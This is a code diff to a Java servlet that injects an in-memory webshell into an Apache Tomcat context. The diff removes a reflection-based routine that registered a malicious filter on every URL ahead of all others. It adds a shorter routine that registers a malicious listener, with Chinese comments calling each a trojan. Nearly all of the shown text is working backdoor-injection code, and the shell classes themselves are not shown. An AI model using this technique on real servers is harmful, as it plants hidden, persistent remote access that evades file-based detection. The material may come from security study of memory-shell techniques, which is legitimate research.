@@ -1,6 +1,7 @@
 package cn.safe6.servlet;
 
 import cn.safe6.filter.FilterShell;
+import cn.safe6.listener.ListenerShell;
 import org.apache.catalina.Context;
 import org.apache.catalina.core.ApplicationContext;
 import org.apache.catalina.core.ApplicationFilterConfig;
@@ -42,60 +43,10 @@ public class AddShellServlet3 extends HttpServlet {
             //从ApplicationContext里面拿到StandardContext
             StandardContext standardContext = (StandardContext) atx.get(applicationContext);
 
-            //准备filter马
-            FilterShell filterShell = new FilterShell();
-
-            //拿到关键的三个对象
-            Field filterDefsField = standardContext.getClass().getDeclaredField("filterDefs");
-            filterDefsField.setAccessible(true);
-            Field filterMapsField = standardContext.getClass().getDeclaredField("filterMaps");
-            filterMapsField.setAccessible(true);
-            Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
-            filterConfigsField.setAccessible(true);
-
-            //用def包装filter
-            FilterDef filterDef = new FilterDef();
-            filterDef.setFilter(filterShell);
-            filterDef.setFilterName(filterShell.getClass().getName());
-            filterDef.setFilterClass(filterShell.getClass().getName());
-
+            //准备listener马
+            ListenerShell listenerShell = new ListenerShell();
             //添加到上下文
-            standardContext.addFilterDef(filterDef);
-
-            //配置映射关系
-            FilterMap filterMap = new FilterMap();
-
-            filterMap.setFilterName(filterShell.getClass().getName());
-            filterMap.addURLPattern("/*");
-            //添加到上下文
-            //standardContext.addFilterMap(filterMap);
-            //添加到第一位
-            standardContext.addFilterMapBefore(filterMap);
-
-
-            //无法直接new，需要反射
-            //ApplicationFilterConfig filterConfig = new ApplicationFilterConfig(standardContext,filterDef);
-            //创建filterConfig
-            Class<?> ac = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
-            //Class<?> ac1 = this.getClass().getClassLoader().loadClass("org.apache.catalina.core.ApplicationFilterConfig");
-
-            //构造方法不是public的
-            Constructor constructor = ac.getDeclaredConstructor(Context.class, FilterDef.class);
-            constructor.setAccessible(true);
-            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
-
-            //添加到filterConfigs
-            Map<String, ApplicationFilterConfig> filterConfigs = (Map<String, ApplicationFilterConfig>)filterConfigsField.get(standardContext);
-            filterConfigs.put(filterShell.getClass().getName(),filterConfig);
-
-            //改modifiers
-            Field modifiers = filterConfigsField.getClass().getDeclaredField("modifiers");
-            modifiers.setAccessible(true);
-            modifiers.setInt(filterConfigsField,filterConfigsField.getModifiers() & ~Modifier.FINAL);
-
-            //还原filterConfigs,可以不做，用的是一个引用
-            //filterConfigsField.set(standardContext,filterConfigs);
-
+            standardContext.addApplicationEventListener(listenerShell);
 
 
             resp.getWriter().write("add success!");
